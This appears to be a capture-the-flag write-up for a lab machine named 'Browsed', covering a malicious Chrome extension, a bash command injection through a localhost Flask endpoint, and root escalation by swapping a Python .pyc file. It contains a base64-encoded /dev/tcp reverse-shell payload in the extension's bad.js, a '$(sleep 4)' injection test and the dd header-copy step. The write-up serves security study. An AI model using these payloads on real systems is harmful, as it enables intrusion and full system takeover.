

#### About

`Browsed` is a medium-difficulty Linux machine centred around abusing browser extension functionality to access internal services. By uploading a malicious Chrome extension, we intercept a developer’s browsing activity and uncover an internal Gitea instance hosting a Flask application. Source code analysis reveals a command injection vulnerability in a bash script exposed via a localhost-only endpoint, which we exploit by delivering a second extension to trigger the payload through the developer’s browser and obtain a reverse shell as user `larry`. For privilege escalation, the machine demonstrates insecure handling of Python bytecode: writable access to the `__pycache__` directory allows replacing a trusted `.pyc` file, resulting in arbitrary code execution as root.



## Nmap
command
```
nmap -sC -sV -T5 -v -p- 10.129.244.79
```
output
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## port 80

I can see they did not secure the website yet
![](pics/Pasted%20image%2020260829145638.png)

exploring the functionality
![](pics/Pasted%20image%2020260829145757.png)
I uploaded a extension from the Samples section
![](pics/Pasted%20image%2020260829155210.png)

I got a long error message
![](pics/Pasted%20image%2020260829155135.png)

Trying to grep for interesting endpoints
```
cat output.txt| grep 'https?://[a-zA-Z0-9.]+' -oE
```
![](pics/Pasted%20image%2020260829155531.png)

Lets add this to our `/etc/hosts` file
![](pics/Pasted%20image%2020260829155411.png)

Explore the found endpoint
![655](pics/Pasted%20image%2020260829155634.png)

Found a public repo exposed
![](pics/Pasted%20image%2020260829155816.png)



## Files inspection

Found a backup path
![](pics/Pasted%20image%2020260829160306.png)

Weird file
![](pics/Pasted%20image%2020260829160337.png)


## Files structure

Log this never know when you need them
```
ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"
```
## Code Review

Found this interesting endpoint
```python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid]) # <--- This by itself is safe
    return "Routine executed !"
```
This is not vulnerable to injection by itself but how the bash script deals with arguments is indeed vulnerable to command injection
```bash
if [[ "$1" -eq 0 ]]; then
```

Using this technique
```bash
./routines.sh 2$(sleep 4)
```
![](pics/Pasted%20image%2020260829190105.png)
This sleeps then print the result
![](pics/Pasted%20image%2020260829190122.png)

## Exploitation

Since this is running locally
```python
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

### Finding a way to access the service
Since I can execute chrome extension code on the developer machine I came up with this script replace the `content.js` file from one of the samples
```js
chrome.action.onClicked.addListener(async () => {
  const rawRoutineId = "payload here"; // Contains spaces and special characters
  const encodedRoutineId = encodeURIComponent(rawRoutineId);
  
  try {
    const response = await fetch(`http://127.0.0.1:5000/routines/${encodedRoutineId}`, {
      method: 'GET'
    });
  } 
  catch (error) {
  }
});
```
This would not work because the tester is not interacting with the extension it self in the way that will trigger the code.

Searching for a different approach on the chrome documentation
![](pics/Pasted%20image%2020260829190435.png)

Added this to the manifest file
```js
"background": { "service_worker": "bad.js"},
```
So now I do not edit the `content.js` file anymore I created a standalone file called `bad.js`
### Crafting the payload

![](pics/Pasted%20image%2020260829185441.png)



I put this payload in it after trying multiple approach this one worked for me, inside `bad.js`:
```js
const url = "http://127.0.0.1:5000/routines/x[$(echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgyLzk5MTEgMD4mMQ== | base64 -d | bash)]";

fetch(url);

```
The last part `| bash` gave me the most trouble because without it, the command gets decoded without executing.


## Flag 1

![](pics/Pasted%20image%2020260829190925.png)


## PrivEsc

Seeing what can `larry` use with `sudo` :
```bash
sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

### Code review

```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')
if __name__ == '__main__':
    main()
```
Well nothing interesting in the code so it must be something else.
### Another approach

Look for a way to utilize this script
![](pics/Pasted%20image%2020260829192414.png)

This file got created in the `__pycache__` directory:
![](pics/Pasted%20image%2020260829192456.png)

Extra inforamtion about the pyCache directory
![](pics/Pasted%20image%2020260829193208.png)
### Abusing  __pycache__

Since I have full permissions on the `__pycache__` directory
![](pics/Pasted%20image%2020260829193552.png)

I can replace the complied module code with my custom code that will be executed as root.

First lets see what functions from `extension_utils.py` are imported
```python
from extension_utils import validate_manifest, clean_temp_files
```

### Plan
I will compile a file that execute '/bin/bash' but with the same header contents of `extension_utils_cpython-312..pyc` so it will not  re-compile again. Since it is executing as root we will get a root shell.
![](pics/Pasted%20image%2020260829202024.png)
### .pyc structure
I need to check `.pyc` structure to know what is the important bytes to avoid getting the compiled library to get re-compiled.
![](pics/Pasted%20image%2020260829204920.png)
So the header is 16 bytes long to be safe that the number of bytes will copy.


### Creating our malicious .pyc
Simple python script
![](pics/Pasted%20image%2020260829202541.png)

compile it to `.pyc` via command:
```
python3 -m compileall bad.py 
```
![](pics/Pasted%20image%2020260829203157.png)

Compare headers
![](pics/Pasted%20image%2020260829203229.png)


### copy header from original to malicious
```
dd if=/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc of=bad.cpython-312.pyc bs=1 count=16 conv=notrunc
```

Now headers match
![](pics/Pasted%20image%2020260829203305.png)

Rename malicious file to match the compiled local library, move it to the same path then execute the script with `sudo`.

![](pics/Pasted%20image%2020260829203445.png)
As we can see a root shell is spawned!

## Flag 2

![](pics/Pasted%20image%2020260829203523.png)
Done.

![](pics/Pasted%20image%2020260829203548.png)

